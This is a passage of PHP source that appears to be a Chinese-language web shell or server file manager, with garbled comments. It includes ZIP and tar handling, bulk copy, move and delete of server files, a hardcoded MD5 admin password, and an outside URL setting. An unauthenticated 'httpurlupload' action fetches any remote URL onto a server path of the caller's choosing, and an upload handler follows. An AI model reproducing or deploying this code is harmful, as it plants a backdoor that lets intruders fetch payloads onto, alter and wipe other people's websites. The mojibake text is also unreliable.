            $str = "";
            for ($i = 0; $i <$this->_indent * $this->indent_width; $i++) {
                $str  .= " ";
            }
            return $str;
        }
   
        function _verify() {
            $test1 = ereg_replace("[\r\n\t ]*", "", $this->_original);
            $test1 = ereg_replace("<\?php", "", $test1);
            $test1 = ereg_replace("<\?", "", $test1);
            $test2 = ereg_replace("[\r\n\t ]*", "", $this->_allstr);
            $test2 = ereg_replace("<\?php", "", $test2);
            $test2 = ereg_replace("<\?", "", $test2);
            if (md5($test1)  != md5($test2)) {
                return $this->raiseError("Original and beauty version aren't equal. Please find the differences and send them to the author ;-)");
            } else {
                return true;
            }
        }
    }
//-----�﷨���������------------------------------

//�������༰��������

class zip //ZIPѹ����
{

 var $datasec, $ctrl_dir = array();
 var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
 var $old_offset = 0; var $dirs = Array(".");

 function get_List($zip_name)
 {
   $zip = @fopen($zip_name, 'rb');
   if(!$zip) return(0);
   $centd = $this->ReadCentralDir($zip,$zip_name);

    @rewind($zip);
    @fseek($zip, $centd['offset']);

   for ($i=0; $i<$centd['entries']; $i++)
   {
    $header = $this->ReadCentralFileHeaders($zip);
    $header['index'] = $i;$info['filename'] = $header['filename'];
    $info['stored_filename'] = $header['stored_filename'];
    $info['size'] = $header['size'];$info['compressed_size']=$header['compressed_size'];
    $info['crc'] = strtoupper(dechex( $header['crc'] ));
    $info['mtime'] = $header['mtime']; $info['comment'] = $header['comment'];
    $info['folder'] = ($header['external']==0x41FF0010||$header['external']==16)?1:0;
    $info['index'] = $header['index'];$info['status'] = $header['status'];
    $ret[]=$info; unset($header);
   }
  return $ret;
 }
 function Add($files,$compact)
 {
  if(!is_array($files[0])) $files=Array($files);

  for($i=0;$files[$i];$i++){
    $fn = $files[$i];
    if(!in_Array(dirname($fn[0]),$this->dirs))
     $this->add_Dir(dirname($fn[0]));
    if(basename($fn[0]))
     $ret[basename($fn[0])]=$this->add_File($fn[1],$fn[0],$compact);
  }
  return $ret;
 }

 function get_file()
 {
   $data = implode('', $this -> datasec);
   $ctrldir = implode('', $this -> ctrl_dir);

   return $data . $ctrldir . $this -> eof_ctrl_dir .
    pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).
    pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
 }

 function add_dir($name) 
 { 
   $name = str_replace("\\", "/", $name); 
   $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 

   $fr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
   $fr .= pack("v", 0 ).$name.pack("V", 0).pack("V", 0).pack("V", 0); 
   $this -> datasec[] = $fr;

   $new_offset = strlen(implode("", $this->datasec)); 

   $cdrec = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
   $cdrec .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
   $cdrec .= pack("v", 0 ).pack("v", 0 ).pack("v", 0 ).pack("v", 0 ); 
   $ext = "\xff\xff\xff\xff"; 
   $cdrec .= pack("V", 16 ).pack("V", $this -> old_offset ).$name; 

   $this -> ctrl_dir[] = $cdrec; 
   $this -> old_offset = $new_offset; 
   $this -> dirs[] = $name;
 }

 function add_File($data, $name, $compact = 1)
 {
   $name     = str_replace('\\', '/', $name);
   $dtime    = dechex($this->DosTime());

   $hexdtime = '\x' . $dtime[6] . $dtime[7].'\x'.$dtime[4] . $dtime[5]
     . '\x' . $dtime[2] . $dtime[3].'\x'.$dtime[0].$dtime[1];
   eval('$hexdtime = "' . $hexdtime . '";');

   if($compact)
   $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00".$hexdtime;
   else $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00".$hexdtime;
   $unc_len = strlen($data); $crc = crc32($data);

   if($compact){
     $zdata = gzcompress($data); $c_len = strlen($zdata);
     $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
   }else{
     $zdata = $data;
   }
   $c_len=strlen($zdata);
   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $fr .= pack('v', strlen($name)).pack('v', 0).$name.$zdata;

   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);

   $this -> datasec[] = $fr;
   $new_offset        = strlen(implode('', $this->datasec));
   if($compact)
        $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00";
   else $cdrec = "\x50\x4b\x01\x02\x14\x00\x0a\x00\x00\x00\x00\x00";
   $cdrec .= $hexdtime.pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $cdrec .= pack('v', strlen($name) ).pack('v', 0 ).pack('v', 0 );
   $cdrec .= pack('v', 0 ).pack('v', 0 ).pack('V', 32 );
   $cdrec .= pack('V', $this -> old_offset );

   $this -> old_offset = $new_offset;
   $cdrec .= $name;
   $this -> ctrl_dir[] = $cdrec;
   return true;
 }

 function DosTime() {
   $timearray = getdate();
   if ($timearray['year'] <1980) {
     $timearray['year'] = 1980; $timearray['mon'] = 1;
     $timearray['mday'] = 1; $timearray['hours'] = 0;
     $timearray['minutes'] = 0; $timearray['seconds'] = 0;
   }
   return (($timearray['year'] - 1980) <<25) | ($timearray['mon'] <<21) |     ($timearray['mday'] <<16) | ($timearray['hours'] <<11) | 
    ($timearray['minutes'] <<5) | ($timearray['seconds'] >> 1);
 }

 function Extract ( $zn, $to, $index = Array(-1) )
 {
   $ok = 0; $zip = @fopen($zn,'rb');
   if(!$zip) return(-1);
   $cdir = $this->ReadCentralDir($zip,$zn);
   $pos_entry = $cdir['offset'];

   if(!is_array($index)){ $index = array($index);  }
   for($i=0; $index[$i];$i++){
     if(intval($index[$i])!=$index[$i]||$index[$i]>$cdir['entries'])
      return(-1);
   }

   for ($i=0; $i<$cdir['entries']; $i++)
   {
     @fseek($zip, $pos_entry);
     $header = $this->ReadCentralFileHeaders($zip);
     $header['index'] = $i; $pos_entry = ftell($zip);
     @rewind($zip); fseek($zip, $header['offset']);
     if(in_array("-1",$index)||in_array($i,$index))
      $stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);
      
   }
   fclose($zip);
   return $stat;
 }

  function ReadFileHeader($zip)
  { 
    $binary_data = fread($zip, 30);
    $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);

    $header['filename'] = fread($zip, $data['filename_len']);
    if ($data['extra_len'] != 0) {
      $header['extra'] = fread($zip, $data['extra_len']);
    } else { $header['extra'] = ''; }

    $header['compression'] = $data['compression'];$header['size'] = $data['size'];
    $header['compressed_size'] = $data['compressed_size'];
    $header['crc'] = $data['crc']; $header['flag'] = $data['flag'];
    $header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];

    if ($header['mdate'] && $header['mtime']){
     $hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;
     $seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;
     $month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;
     $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    }else{$header['mtime'] = time();}

    $header['stored_filename'] = $header['filename'];
    $header['status'] = "ok";
    return $header;
  }

 function ReadCentralFileHeaders($zip){
    $binary_data = fread($zip, 46);
    $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);

    if ($header['filename_len'] != 0)
      $header['filename'] = fread($zip,$header['filename_len']);
    else $header['filename'] = '';

    if ($header['extra_len'] != 0)
      $header['extra'] = fread($zip, $header['extra_len']);
    else $header['extra'] = '';

    if ($header['comment_len'] != 0)
      $header['comment'] = fread($zip, $header['comment_len']);
    else $header['comment'] = '';

    if ($header['mdate'] && $header['mtime'])
    {
      $hour = ($header['mtime'] & 0xF800) >> 11;
      $minute = ($header['mtime'] & 0x07E0) >> 5;
      $seconde = ($header['mtime'] & 0x001F)*2;
      $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
      $month = ($header['mdate'] & 0x01E0) >> 5;
      $day = $header['mdate'] & 0x001F;
      $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    } else {
      $header['mtime'] = time();
    }
    $header['stored_filename'] = $header['filename'];
    $header['status'] = 'ok';
    if (substr($header['filename'], -1) == '/')
      $header['external'] = 0x41FF0010;
    return $header;
 }

 function ReadCentralDir($zip,$zip_name)
 {
  $size = filesize($zip_name);
  if ($size <277) $maximum_size = $size;
  else $maximum_size=277;

  @fseek($zip, $size-$maximum_size);
  $pos = ftell($zip); $bytes = 0x00000000;

  while ($pos <$size)
  {
    $byte = @fread($zip, 1); $bytes=($bytes <<8) | Ord($byte);
    if ($bytes == 0x504b0506){ $pos++; break; } $pos++;
  }

 $data=unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',fread($zip,18));


  if ($data['comment_size'] != 0)
    $centd['comment'] = fread($zip, $data['comment_size']);
    else $centd['comment'] = ''; $centd['entries'] = $data['entries'];
  $centd['disk_entries'] = $data['disk_entries'];
  $centd['offset'] = $data['offset'];$centd['disk_start'] = $data['disk_start'];
  $centd['size'] = $data['size'];  $centd['disk'] = $data['disk'];
  return $centd;
 }

 function ExtractFile($header,$to,$zip)
 {
   $header = $this->readfileheader($zip);

   if(substr($to,-1)!="/") $to.="/";
   if(!@is_dir($to)) @mkdir($to,0777);

   $pth = explode("/",dirname($header['filename']));
   for($i=0;isset($pth[$i]);$i++){
     if(!$pth[$i]) continue;$pthss.=$pth[$i]."/";
     if(!is_dir($to.$pthss)) @mkdir($to.$pthss,0777);
   }
  if (!($header['external']==0x41FF0010)&&!($header['external']==16))
  {
   if ($header['compression']==0)
   {
    $fp = @fopen($to.$header['filename'], 'wb');
    if(!$fp) return(-1);
    $size = $header['compressed_size'];

    while ($size != 0)
    {
      $read_size = ($size <2048 ? $size : 2048);
      $buffer = fread($zip, $read_size);
      $binary_data = pack('a'.$read_size, $buffer);
      @fwrite($fp, $binary_data, $read_size);
      $size -= $read_size;
    }
    fclose($fp);
    touch($to.$header['filename'], $header['mtime']);

  }else{
   $fp = @fopen($to.$header['filename'].'.gz','wb');
   if(!$fp) return(-1);
   $binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']),
     Chr(0x00), time(), Chr(0x00), Chr(3));

   fwrite($fp, $binary_data, 10);
   $size = $header['compressed_size'];

   while ($size != 0)
   {
     $read_size = ($size <1024 ? $size : 1024);
     $buffer = fread($zip, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }

   $binary_data = pack('VV', $header['crc'], $header['size']);
   fwrite($fp, $binary_data,8); fclose($fp);

   $gzp = @gzopen($to.$header['filename'].'.gz','rb') or die("Cette archive est compress�e");
    if(!$gzp) return(-2);
   $fp = @fopen($to.$header['filename'],'wb');
   if(!$fp) return(-1);
   $size = $header['size'];

   while ($size != 0)
   {
     $read_size = ($size <2048 ? $size : 2048);
     $buffer = gzread($gzp, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }
   fclose($fp); gzclose($gzp);

   touch($to.$header['filename'], $header['mtime']);
   @unlink($to.$header['filename'].'.gz');

  }}
  return true;
 }
} //ZIPѹ����end

Class tarlib { //zlib/tar/gz�࿪ʼ
var $tarname = ''; 
var $filehand = 0; 

function checkcompress() { 
global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write; 

if((substr($this->tarname, -7)=='.tar.gz') || (substr($this->tarname, -4)=='.tgz')) { 
$_dofunc_open = 'gzopen'; 
$_dofunc_close = 'gzclose'; 
$_dofunc_read = 'gzread'; 
$_dofunc_write = 'gzwrite'; 
} else { 
$_dofunc_open = 'fopen'; 
$_dofunc_close = 'fclose'; 
$_dofunc_read = 'fread'; 
$_dofunc_write = 'fwrite'; 
} 
} 

function mkdir($dir) { 
$dirlist = explode('/', $dir); 
$depth = count($dirlist)-1; 
$dir = $dirlist[0]; 
for($i = 0; $i<$depth; $i++) { 
if(!is_dir($dir)) { 
if($dir!='.')
mkdir($dir, 0777); 
} 
$dir.= '/'.$dirlist[$i+1]; 
$last = $off; 
} 
} 

function checksum($binary_data_first, $binary_data_last = '') { 
if($binary_data_last=='') { 
$binary_data_last = $binary_data_first; 
} 
$checksum = 0; 
for ($i=0; $i<148; $i++) { 
$checksum += ord(substr($binary_data_first, $i, 1)); 
} 
for ($i=148; $i<156; $i++) { 
$checksum += ord(' '); 
} 
for ($i=156, $j=0; $i<512; $i++, $j++) { 
$checksum += ord(substr($binary_data_last, $j, 1)); 
} 
return $checksum; 
} 
} 

Class tar extends tarlib { 

var $filelist = array(); 

function tar($tarname, $filelist) { 
global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write; 

$this->tarname = $tarname; 
$this->checkcompress(); 
$this->filelist = is_array($filelist) ? $filelist : explode(' ', $filelist); 

$this->create(); 
} 

function create() { 
global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write; 

$this->filehand = $_dofunc_open($this->tarname, 'wb'); 

$this->parse($this->filelist); 
$this->footer(); 

$_dofunc_close($this->filehand); 
} 

function parse($filelist) { 
global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write; 

$files = count($filelist); 
for($i = 0; $i <$files; $i++) { 
$filename = $filelist[$i]; 
if(is_dir($filename)) { 
$dirh = opendir($filename); 
readdir($dirh); // '.' 
readdir($dirh); // '..' 
while($nextfile = readdir($dirh)) { 
$temp_filelist[] = ($filename != '.') ? $filename.'/'.$nextfile : $nextfile; 
} 
$this->parse($temp_filelist); 
closedir($dirh); 
unset($dirh); 
unset($temp_filelist); 
unset($nextfile); 
continue; 
} 
$this->parseFile($filename); 
} 
} 

function parseFile($filename) { 
global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write; 

$v_info = stat($filename); 
$v_uid = sprintf('%6s ', DecOct($v_info[4])); 
$v_gid = sprintf('%6s ', DecOct($v_info[5])); 
$v_perms = sprintf('%6s ', DecOct(fileperms($filename))); 
clearstatcache(); 
$v_size = filesize($filename); 
$v_size = sprintf('%11s ', DecOct($v_size)); 
$v_mtime = sprintf('%11s', DecOct(filemtime($filename))); 

$v_binary_data_first = pack('a100a8a8a8a12A12', $filename, $v_perms, $v_uid, $v_gid, $v_size, $v_mtime); 
$v_binary_data_last = pack('a1a100a6a2a32a32a8a8a155a12', '', '', '', '', '', '', '', '', '', ''); 
$_dofunc_write($this->filehand, $v_binary_data_first, 148); 

$v_checksum = $this->checksum($v_binary_data_first, $v_binary_data_last); 

$v_checksum = sprintf('%6s ', DecOct($v_checksum)); 
$v_binary_data = pack('a8', $v_checksum); 
$_dofunc_write($this->filehand, $v_binary_data, 8); 
$_dofunc_write($this->filehand, $v_binary_data_last, 356); 

$fp = fopen($filename, 'rb'); 
while(($buffer = fread($fp, 512)) <> '') { 
$binary_buffer = pack('a512', $buffer); 
$_dofunc_write($this->filehand, $binary_buffer); 
} 
} 

function footer() { 
global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write; 

$v_binary_data = pack('a512', ''); 
$_dofunc_write($this->filehand, $v_binary_data); 
} 
} 


Class tarExtract extends tarlib { 

var $extractDir = './extract'; 

function tarExtract($tarname, $extractDir = './extract') { 
global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write; 

$this->tarname = $tarname; 
$this->extractDir = $extractDir; 
$this->checkcompress(); 

if(!is_dir($extractDir)) { 
$this->mkdir($extractDir); 
} 
$this->extract(); 
} 

function extract() { 
global $_dofunc_open, $_dofunc_close, $_dofunc_read, $_dofunc_write; 

$this->filehand = $_dofunc_open($this->tarname, 'rb'); 
while(($binary_buffer = fread($this->filehand, 512)) <> '') { 
$file = $this->parseHeader($binary_buffer); 
if(!$file['name']) continue; 
$file['name'] = $this->extractDir.'/'.$file['name']; 
$readtimes = floor($file['size']/512); 

$this->mkdir($file['name']); 
$fp = fopen($file['name'], 'wb'); 
for($i = 0; $i<$readtimes; $i++) { 
fwrite($fp, $_dofunc_read($this->filehand, 512)); 
} 
if(($lastsize = $file['size']%512)) { 
fwrite($fp, $_dofunc_read($this->filehand, 512), $lastsize); 
} 
fclose($fp); 
} 
$_dofunc_close($this->filehand); 
} 

function parseHeader($header) { 

$checksum = $this->checksum($header); 
$data = unpack('a100filename/a8mode/a8uid/a8gid/a12size/a12mtime/a8checksum/a1typeflag/a100link/a6magic/a2version/a32uname/a32gname/a8devmajor/a8devminor', $header); 

$file['checksum'] = OctDec(trim($data['checksum'])); 
/* 
if($file['checksum']<>$checksum) { 
return false; 
} 
*/ 
$file['name'] = trim($data['filename']); 
$file['mode'] = OctDec(trim($data['mode'])); 
$file['uid'] = OctDec(trim($data['uid'])); 
$file['gid'] = OctDec(trim($data['gid'])); 
$file['size'] = OctDec(trim($data['size'])); 
$file['mtime'] = OctDec(trim($data['mtime'])); 
$file['type'] = $data['typeflag']; 

return $file; 
} 
} //zlib/tar/gzѹ����end

function writetofile($filename,$book) { //д���ļ�
	@$fd=fopen("$filename","wb");
	@fwrite($fd,$book);
	@fclose($fd);
	return $fd;
}

function addziparray($dir2) //����ZIP�ļ�
{
	global $dir,$zipfilearray;
	@$dirs=opendir($dir."/".$dir2);
	while (@$file=readdir($dirs)) { 
		if(!is_dir("$dir/$dir2/$file")) {
			$zipfilearray[]="$dir2/$file";
		}
		elseif($file!="."&&$file!=".."&&$file!="..") {
			addziparray("$dir2/$file");
		}
	}
	@closedir($dirs);
}

function copymore($file) //���������ļ�
{
	global $olddir,$dir,$f,$d;
	for($i=0;$file[$i];$i++){
		$oldfile="$olddir/$file[$i]";
		if(file_exists($oldfile)){
			if(is_dir($oldfile)){				
				if(!is_dir("$dir/$file[$i]")) if(@mkdir($dir."/".$file[$i],0777)) $d++;
				unset($newfile);
				$dirs=@opendir($oldfile);
				while($files=@readdir($dirs)) {
					if($files!="."&&$files!="..") {
						$newfile[]=$file[$i]."/".$files;
					}
				}
				@closedir($dirs);
				if(!empty($newfile)) copymore($newfile,$copy);
			}
			else{
				$newfile="$dir/$file[$i]";
				$fp=@fopen($oldfile,rb);
				$filedata=@fread($fp,@filesize($oldfile));
				@fclose($fp);
				if(writetofile($newfile,$filedata)) $f++;
			}
		}
	}
}

function cutmore($file) //���������ļ�
{
	global $olddir,$dir,$f,$d;
	for($i=0;$file[$i];$i++){
		$oldfile="$olddir/$file[$i]";
		if(file_exists($oldfile)){
			if(is_dir($oldfile)){
				if(!is_dir("$dir/$file[$i]")) if(@mkdir($dir."/".$file[$i],0777)) $d++;
				unset($newfile);
				$dirs=@opendir($oldfile);
				while($files=@readdir($dirs)) {
					if($files!="."&&$files!="..") {
						$newfile[]=$file[$i]."/".$files;
					}
				}
				@closedir($dirs);
				if(!empty($newfile)) cutmore($newfile);
				@rmdir($oldfile);
			}
			else{
				$newfile="$dir/$file[$i]";
				$fp=@fopen($oldfile,rb);
				$filedata=@fread($fp,@filesize($oldfile));
				@fclose($fp);
				if(writetofile($newfile,$filedata)&&unlink($oldfile)) $f++;				
			}
		}
	}
}

function delmore($file) //����ɾ���ļ�
{
	global $dir,$f,$d;
	for($i=0;$file[$i];$i++){
		$delfile="$dir/$file[$i]";
		if(file_exists($delfile)){
			if(is_dir($delfile)){
				$dirs=@opendir($delfile);
				while($files=@readdir($dirs)) {
					if($files!="."&&$files!="..") {
						$newfile[]=$file[$i]."/".$files;
						$del++;
					}
				}
				if(!empty($newfile)) delmore($newfile,$del);
				@closedir($dirs);
				if(@rmdir($delfile)) $d++;
			}
			else{
				if(@unlink($delfile)) $f++;
			}
		}
	}
}

function wlcunzip($undir,$data){ //��ѹ
                  $fp=fopen($data,"r");
                  $msg=explode("|"."wlc|",fread($fp,filesize($data)));
                  fclose($fp);
                  $num=count($msg)-3;
                  @mkdir($undir,0777);
                  $wlcdir=explode("|"."w|",$msg[$num+1]);
                  for($i=0;$i<=count($wlcdir)-1;$i++)
                      {
                      @mkdir("$undir/$wlcdir[$i]",0777);
                      }
                  $file=explode("|"."w|",$msg[$num+2]);
                  for($i=1;$i<=count($file)-1;$i++)
                      {
                                       $a=0;
                      $fp=fopen("$undir/$file[$i]","w");
                      fwrite($fp,$msg[$i-1]);
                      if(@fclose($fp))$a=1;
                      }
                               return $a;
                  }
function ReadCentralDir($zipfile)//��ȡzip ��Ϣ
        {
            $zip = @fopen($zipfile, 'rb');
            $size     = filesize($zipfile);
            $max_size = ($size < 277) ? $size : 277;
            
            @fseek($zip, $size - $max_size);
            $pos   = ftell($zip);
            $bytes = 0x00000000;
            
            while($pos < $size)
            {
                $byte  = @fread($zip, 1);
                $bytes = ($bytes << 8) | Ord($byte);
                $pos++;
                if($bytes == 0x504b0506){ break; }
            }
            
            $data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', fread($zip, 18));

            $centd['comment']      = ($data['comment_size'] != 0) ? fread($zip, $data['comment_size']) : '';  // ע��
            $centd['entries']      = $data['entries'];
            $centd['disk_entries'] = $data['disk_entries'];
            $centd['offset']       = $data['offset'];
            $centd['disk_start']   = $data['disk_start'];
            $centd['size']         = $data['size'];
            $centd['disk']         = $data['disk'];
            fclose($zip);
            return $centd;
        }
//////////////////////////////////////////////////////////////////
$adminpass="670b14728ad9902aecba32e22fa4f6bd";	//��������MD5
$color1="0CEE0C"; //�༭����ǰ��ɫ
$color2="000000"; //�༭������ɫ
$color3="13"; //�༭�����ִ�С
$color4="smtp.126.com"; //smtp������
$color5=""; //smtp�û���
$color6=""; //smtp����
$color7="25"; //smtp�˿�
$color8=""; //���ٱ����ļ����ƶ�����
$color9="0";
$color10="";
$color11="";
$color12="http://hmu136033.chinaw3.com/8.txt";
////////////////////////////////////////////////////////////////////
//Զ������-------------------------------=
if ($action=='httpurlupload' && $url!="" && $newfname!=""){
function ResolvedUrl($url){
        $url = str_ireplace('thunder://','',$url);
	$url = str_ireplace('qqdl://','',$url);
	$url = str_ireplace('flashget://','',$url);
	$url = base64_decode($url);
	$url = str_ireplace('[FLASHGET]','',$url);
	if(preg_match('/AA(.*)ZZ/',$url,$result))
	{
		$result = $result[1];
	}
	else
	{
		$result = $url;
	}
        return $result;
}


function zhuanhuan($url) { 
	$urlodd=explode('//',$url,2);//�����ӷֳ�2�Σ�//ǰ���ǵ�һ�Σ�������ǵڶ��� 
	$head=strtolower($urlodd[0]);//PHP�Դ�Сд���У���ͳһת����Сд����Ȼ ����HtTp:����ThUNDER:���ֹ����д�����ô��� 
	$behind=$urlodd[1]; 
	if($head=="thunder:"){ 
		$url=substr(base64_decode($behind), 2, -2);//base64���ܣ�ȥ��ǰ���AA�ͺ���ZZ 
	}elseif($head=="flashget:"){ 
		$url1=explode('&',$behind,2); 
		$url=substr(base64_decode($url1[0]), 10, -10);//base64���ܣ�ȥ��ǰ����[FLASHGET] 
	}elseif($head=="qqdl:"){ 
		$url=base64_decode($behind);//base64���� 
	}elseif($head=="http:"||$head=="ftp:"||$head=="mms:"||$head=="rtsp:"||$head=="https:"){ 
		$url=$url; 
	}else{
		$url= "no";
	} 
	return $url; 
} 

?>
<html>
<style>*{font-size:12px;}</style>
<body>
<?

$urla=explode(":",$url);
$urla[0]=strtolower($urla[0]);
if($urla[0]=="ftp" || $urla[0]=="http" || $urla[0]=="https" || $urla[0]=="mms" || $urla[0]=="rtsp"){

}else if($urla[0]=="thunder" || $urla[0]=="qqdl" || $urla[0]=="flashget"){
$url=ResolvedUrl($url);
}else{
die("�޷�ʶ���·��!");
}
$filename=basename ($url);
$newfname=rawurldecode($newfname)."/".$filename;

if($SBss=="1"){
  if($urla[0]=="thunder" || $urla[0]=="qqdl" || $urla[0]=="flashget"){
?>
<table border="0" width="80%" cellspacing="0" cellpadding="0" align="center">
<tr><td width="60" align="center">Ŀ���ַ:</td><td><input type="text" name="T1" value="<?=$url?>" style="width:100%;border:1px solid #E7E7E7;"></td></tr>
</table>
<?
  }else if($urla[0]=="ftp" || $urla[0]=="http" || $urla[0]=="https" || $urla[0]=="mms" || $urla[0]=="rtsp"){
          if($urla[1]!="" && $urla[1]!="//" ){
	$url=zhuanhuan($url); 
	$url_thunder="thunder://".base64_encode("AA".$url."ZZ");//base64���ܣ������2Ҳһ�� 
	$url_flashget="Flashget://".base64_encode("[FLASHGET]".$url."[FLASHGET]")."&aiyh"; 
	$url_qqdl="qqdl://".base64_encode($url);
?>
<table border="0" width="80%" cellspacing="0" cellpadding="0" align="center">
<tr><td width="55" align="center">ԭ��ַ��</td><td><input type="text" name="T1" value="<?=$url?>" style="width:100%;border:1px solid #E7E7E7;"></td></tr>
<tr><td width="55" align="center">Ѹ������</td><td><input type="text" name="T1" value="<?=$url_thunder?>" style="width:100%;border:1px solid #E7E7E7;"></td></tr>
<tr><td width="55" align="center">�쳵����</td><td><input type="text" name="T1" value="<?=$url_flashget?>" style="width:100%;border:1px solid #E7E7E7;"></td></tr>
<tr><td width="55" align="center">��������</td><td><input type="text" name="T1" value="<?=$url_qqdl?>" style="width:100%;border:1px solid #E7E7E7;"></td></tr>
</table>
<?
         }else{
?>
<table border="0" width="80%" cellspacing="0" cellpadding="0" align="center">
<tr><td width="60" align="center">Ŀ���ַ:</td><td><input type="text" name="T1" value="����ת���ĵ�ַ" style="width:100%;border:1px solid #E7E7E7;"></td></tr>
</table>
<?
         }
  }else{
?>
<table border="0" width="80%" cellspacing="0" cellpadding="0" align="center">
<tr><td width="60" align="center">Ŀ���ַ:</td><td><input type="text" name="T1" value="����ת���ĵ�ַ" style="width:100%;border:1px solid #E7E7E7;"></td></tr>
</table>
<?
  }
die();
}
?>
<table border="0" width="80%" cellspacing="0" cellpadding="0" align="center">
<tr><td width="60" align="center">Ŀ���ַ:</td><td><input type="text" name="T1" value="<?=$url?>" style="width:100%;border:1px solid #E7E7E7;"></td></tr>
<tr><td align="center">�ļ���С:</td><td><div id="filesize">δ֪����</div></td></tr>
<tr><td align="center">�Ѿ�����:</td><td><div id="downloaded">0</div></td></tr>
<tr><td align="center">��ɽ���:</td><td  style="border:1px solid #E7E7E7;background:#FFF;"><div id="progressbar" style="float:left;width:1px;text-align:center;color:#FFFFFF;background-color:#0066CC"></div><div id="progressText" style=" float:left">0%</div></td></tr>
</table>
<script type="text/javascript">
//�ļ�����
var filesize=0;
function $(obj) {return document.getElementById(obj);}

//�����ļ�����
function setFileSize(fsize) {
    filesize=fsize;
    $("filesize").innerHTML=fsize;
}

//�����Ѿ����ص�,������ٷֱ�
function setDownloaded(fsize) {
    $("downloaded").innerHTML=fsize;
    if(filesize>0) {
        var percent=Math.round(fsize*100/filesize);
        $("progressbar").style.width=(percent+"%");
        if(percent>0) {
            $("progressbar").innerHTML=percent+"%";
            $("progressText").innerHTML="";
               if(filesize==fsize){
                     alert("�������!");  
               }
        } else {
            $("progressText").innerHTML=percent+"%";
        }
    }
}
</script>
<?php
@set_time_limit(0);
$file = fopen ($url, "rb");
if ($file) {
    //��ȡ�ļ���С
    $filesize = -1;
    $headers = get_headers($url, 1);
    if ((!array_key_exists("Content-Length", $headers))) $filesize=0;
    $filesize = $headers["Content-Length"];
    
    //�������е��ļ������ȷ��ش�С�ģ���Щ��̬ҳ�治�ȷ����ܴ�С���������޷����������
    if ($filesize != -1) echo "<script>setFileSize($filesize);</script>";//��ǰ̨��ʾ�ļ���С
    $newf = fopen ($newfname, "wb");
    $downlen=0;
    if ($newf) {
        while(!feof($file)) {
            $data=fread($file, 1024 * 8 );//Ĭ�ϻ�ȡ8K
            $downlen+=strlen($data);//�ۼ��Ѿ����ص��ֽ���
            fwrite($newf, $data, 1024 * 8 );
            echo "<script>setDownloaded($downlen);</script>";//��ǰ̨��ʾ�Ѿ������ļ���С
            ob_flush();
            flush();
        }
    }
    if ($file) fclose($file);
    if ($newf) fclose($newf);
}
?>
</body>
</html>
<?
die();
}
//�����ϴ�-------------------------------=
if ($action=='urlupload' && $db==md5(base64_encode($adminpass))){
// Returns true if $string is valid UTF-8 and false otherwise.
function is_utf8($word){
if (preg_match("/^([".chr(228)."-".chr(233)."]{1}[".chr(128)."-".chr(191)."]{1}[".chr(128)."-".chr(191)."]{1}){1}/",$word) == true || preg_match("/([".chr(228)."-".chr(233)."]{1}[".chr(128)."-".chr(191)."]{1}[".chr(128)."-".chr(191)."]{1}){1}$/",$word) == true || preg_match("/([".chr(228)."-".chr(233)."]{1}[".chr(128)."-".chr(191)."]{1}[".chr(128)."-".chr(191)."]{1}){2,}/",$word) == true)
{
return true;
}
else
{
return false;
}
} // function is_utf8



function _asUpFiles($dir, $file_var, $max_size='', $type='', $name=false) 
{ 
@set_time_limit(0);//ȡ����ʱ
        if (!is_writeable($dir)) 
        { 
                echo $dir." Can't be written or doesn't exist."; 
                exit(); 
        }
        $upfile     =& $_FILES["$file_var"]; 
        $upfilename =  $upfile['name']; 
        if (!($upfilename==='')) 
        { 
                if (!is_uploaded_file($upfile['tmp_name'])) 
                { 
                        echo $upfilename." Can't be uploaded."; 
                        exit(); 
                }
                if ($max_size>0 && $upfile['size']/1024>$max_size) 
                { 
                        echo 'The size of the file exceeds the limitative value.'; 
                        exit(); 
                }
                $ext_name = strtolower(str_replace(".", "", strrchr($upfilename, "."))); 
                if($name!=""){
                $uploadname = $name;// ? md5(uniqid(rand())).".".$ext_name : $upfilename; 
